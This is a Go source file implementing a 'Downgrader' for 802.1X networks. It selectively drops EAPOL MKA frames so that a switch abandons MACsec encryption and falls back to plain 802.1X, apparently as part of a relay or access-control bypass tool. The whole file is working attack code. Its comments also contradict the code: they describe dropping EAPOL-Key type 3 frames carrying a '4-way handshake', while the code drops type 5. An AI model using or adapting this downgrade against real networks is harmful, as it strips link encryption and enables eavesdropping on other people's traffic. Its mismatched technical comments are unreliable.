package eapol

import (
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// Downgrader selectively drops EAPOL-Key frames that carry MACsec Key Agreement
// (MKA) data. By stripping these frames, the authenticator may fall back to
// standard (unencrypted) 802.1X, allowing transparent bridging.
//
// This only works on switches that don't hard-require MACsec. If the switch
// mandates MACsec and re-auth fails after the downgrade, the relay reports failure.
type Downgrader struct {
	mu         sync.Mutex
	enabled    bool
	droppedMKA int
}

// NewDowngrader creates a new MACsec downgrader.
func NewDowngrader() *Downgrader {
	return &Downgrader{
		enabled: true,
	}
}

// ShouldDrop inspects an EAPOL packet and returns true if the frame should be
// dropped to effect a MACsec downgrade.
//
// We drop:
//   - EAPOL-Key frames (type 3) — these carry the MKA 4-way handshake
//     used to establish MACsec Secure Associations (SA).
//
// We pass through:
//   - EAPOL-EAP frames (type 0) — normal authentication
//   - EAPOL-Start (type 1) — session initiation
//   - EAPOL-Logoff (type 2) — session teardown
func (d *Downgrader) ShouldDrop(packet gopacket.Packet) bool {
	d.mu.Lock()
	defer d.mu.Unlock()

	if !d.enabled {
		return false
	}

	eapolLayer := packet.Layer(layers.LayerTypeEAPOL)
	if eapolLayer == nil {
		return false
	}

	eapol, _ := eapolLayer.(*layers.EAPOL)

	// MKA (type 5) carries MACsec key negotiation.
	if eapol.Type == layers.EAPOLType(5) {
		d.droppedMKA++
		return true
	}

	return false
}

// RecordDrop increments the dropped MKA stat block manually.
func (d *Downgrader) RecordDrop() {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.droppedMKA++
}

// IsEnabled returns true if the downgrader is active.
func (d *Downgrader) IsEnabled() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.enabled
}

// DroppedCount returns the number of MKA frames that were dropped.
func (d *Downgrader) DroppedCount() int {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.droppedMKA
}

// Disable turns off the downgrader (all frames pass through).
func (d *Downgrader) Disable() {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.enabled = false
}
